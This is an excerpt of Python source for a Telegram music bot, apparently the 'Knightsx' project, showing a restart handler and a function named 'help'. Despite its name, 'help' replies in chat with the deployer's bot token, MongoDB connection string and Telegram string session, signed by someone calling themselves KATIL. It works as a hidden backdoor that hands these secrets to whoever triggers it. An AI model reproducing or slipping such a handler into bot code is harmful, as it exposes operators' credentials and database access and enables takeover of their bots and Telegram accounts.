...
from Knightsx.utils.database import get_authuser_names, get_cmode
from Knightsx.utils.decorators import (ActualAdminCB, AdminActual,
                                         language)
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await Knightsx.stop_stream(message.chat.id)
    except:
        pass
...
async def help(client: Client, message: Message):
    await message.reply_photo(
          photo=f"https://telegra.ph/file/dc31ab3384c2417e45dee.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 KATIL.\n\n☆............𝙱𝚈 » [亗『𝐊𝐀𝐓𝐈𝐋』亗](https://t.me/katil_your_dad)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• ᴘᴏᴡᴇʀᴇᴅ ʙʏ 亗『ᴏᴡɴᴇʀ』亗 •", url=f"https://t.me/Nagi2308")
                 ]
             ]
         ),
     )
